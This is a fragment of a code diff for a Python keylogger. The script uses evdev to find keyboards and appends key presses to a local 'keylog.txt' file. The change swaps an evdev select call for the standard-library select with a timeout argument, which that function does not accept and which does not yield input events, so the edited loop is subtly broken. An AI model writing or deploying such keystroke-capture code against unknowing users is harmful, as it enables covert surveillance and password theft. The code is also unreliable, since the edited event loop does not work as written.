@@ -1,8 +1,10 @@
 import evdev
 
 from evdev import InputDevice, ecodes
+from select import select
 
 devices=evdev.list_devices()
+
 
 keyboards = []
 for path in devices:
@@ -14,7 +16,7 @@ print(keyboards)
 
 log_file = open('keylog.txt','a',buffering=1)
 try:
-    for device, event in evdev.select(keyboards):
+    for event in select(keyboards, timeout=1):
 
         if event.type == 1 and event.value == 1:
 
